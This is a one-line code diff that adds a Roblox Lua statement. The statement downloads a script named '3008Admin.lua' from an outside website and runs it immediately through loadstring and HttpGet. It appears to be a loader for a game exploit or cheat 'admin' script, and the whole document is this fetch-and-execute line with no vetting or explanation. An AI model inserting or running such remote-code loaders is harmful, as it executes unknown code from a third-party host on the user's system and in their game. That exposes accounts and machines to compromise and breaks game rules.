@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://system-exodus.com/shared/branden/3008Admin.lua",true))()
